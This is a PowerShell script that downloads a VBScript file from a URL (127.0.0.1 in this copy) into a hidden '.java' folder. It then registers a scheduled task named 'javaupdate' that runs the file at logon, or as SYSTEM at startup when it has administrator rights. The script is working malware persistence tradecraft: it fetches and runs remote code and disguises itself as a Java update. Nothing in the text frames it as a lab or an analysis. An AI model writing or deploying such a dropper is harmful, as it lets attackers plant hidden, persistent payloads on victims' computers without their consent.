# Task and file setup
$taskName = "javaupdate"
$javaDir = "$env:USERPROFILE\.java"
$javaVbsPath = "$javaDir\java.vbs"
$fileUrl = "http://127.0.0.1/java.vbs"

# Check if the scheduled task already exists
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Write-Output "Task '$taskName' already exists. Exiting script."
    return
}

# Create the .java directory if it doesn't exist
if (-not (Test-Path $javaDir)) {
    New-Item -ItemType Directory -Path $javaDir | Out-Null
    attrib +h $javaDir  # Hide the folder
}

# Download the java.vbs file
try {
    Invoke-WebRequest -Uri $fileUrl -OutFile $javaVbsPath -ErrorAction Stop
    Write-Output "Downloaded java.vbs to $javaVbsPath"
}
catch {
    Write-Error "Failed to download java.vbs: $_"
    return
}

# Determine privilege level
$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Set up the task trigger and principal
if ($isAdmin) {
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
    Write-Output "Running with administrator privileges. Task will run as SYSTEM at startup."
} else {
    $trigger = New-ScheduledTaskTrigger -AtLogon -User "$env:USERDOMAIN\$env:USERNAME"
    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
    Write-Output "Running without admin. Task will run at logon for current user."
}

# Define the task action
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$javaVbsPath`""

# Register the task
try {
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal
    Write-Output "Scheduled task '$taskName' created successfully."
}
catch {
    Write-Error "Failed to register task: $_"
}
